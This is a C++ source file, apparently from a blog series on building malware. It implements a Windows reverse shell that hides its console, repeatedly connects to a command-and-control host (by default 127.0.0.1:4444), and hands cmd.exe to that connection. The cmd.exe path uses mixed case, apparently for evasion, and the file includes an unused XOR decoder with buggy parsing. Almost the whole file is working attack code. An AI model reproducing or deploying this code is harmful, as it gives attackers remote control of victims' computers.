//Author : Paranoid Ninja
//Email  : paranoidninja@protonmail.com
//Blog   : https://scriptdotsh.com/index.php/2018/09/04/malware-on-steroids-part-1-simple-cmd-reverse-shell/

//Compile with g++/i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
//The effective size with statically compiled code should be around 13 Kb


#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024

void Decrypter(char* EncryptedData, int EncryptedDataLength, char* DecryptedData){
    memset(DecryptedData, 0, sizeof(DecryptedData));
    int EncProcessIntArray[EncryptedDataLength] = {};
    char XoredNum[4];
    memset(XoredNum, 0, sizeof(XoredNum));
    int j = 0;
    int k = 0;
    for(int i = 0; i < (strlen(EncryptedData)); i++){
        if(EncryptedData[i] == *","){
            EncProcessIntArray[k] = atoi(XoredNum);
        }
        else{
            XoredNum[j] = EncryptedData[i];
            j++;
        }
        EncProcessIntArray[k] = atoi(XoredNum);
    }
    for(int i=0; i<(EncryptedDataLength); i++){
        DecryptedData[i] = EncProcessIntArray[i] ^ EncProcessIntArray[EncryptedDataLength-1];

    }
}

void RunShell(char* C2Server, int C2Port) {
    while(true) {
        Sleep(5000);    // 1000 = One Second

        SOCKET mySocket;
        sockaddr_in addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2,2), &version);
        mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;
   
        addr.sin_addr.s_addr = inet_addr(C2Server);  //IP received from main function
        addr.sin_port = htons(C2Port);     //Port received from main function

        //Connecting to Proxy/ProxyIP/C2Host
        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
            continue;
        }
        else {
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
            if (RecvCode == 1337) {
                closesocket(mySocket);
                WSACleanup();
                continue;
            }
            else {
                char Process[] = "C:\\WindOWs\\syStEm32\\Cmd.exE";
                STARTUPINFO sinfo;
                PROCESS_INFORMATION pinfo;
                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
                CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                WaitForSingleObject(pinfo.hProcess, INFINITE);
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);

                memset(RecvData, 0, sizeof(RecvData));
                int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
                if (RecvCode <= 0) {
                    closesocket(mySocket);
                    WSACleanup();
                    continue;
                }
                if (strcmp(RecvData, "exit\n") == 0) {
                    exit(0);
                }
            }
        }
    }
}

int main(int argc, char **argv) {
    FreeConsole();
    if (argc == 3) {
        int port  = atoi(argv[2]); //Converting port in Char datatype to Integer format
        RunShell(argv[1], port);
    }
    else {
        char host[] = "127.0.0.1";
        int port = 4444;
        RunShell(host, port);
    }
    return 0;
}

//make shell optional
